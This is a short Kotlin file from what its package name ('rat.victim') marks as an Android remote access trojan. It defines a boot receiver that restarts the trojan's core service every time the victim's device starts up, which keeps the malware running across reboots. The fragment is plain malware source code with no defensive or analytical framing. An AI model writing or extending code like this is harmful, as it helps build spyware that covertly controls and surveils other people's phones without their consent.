package com.yourname.rat.victim

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.yourname.rat.victim.services.CoreService

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action == Intent.ACTION_BOOT_COMPLETED) {
            val serviceIntent = Intent(context, CoreService::class.java)
            context.startForegroundService(serviceIntent)
        }
    }
}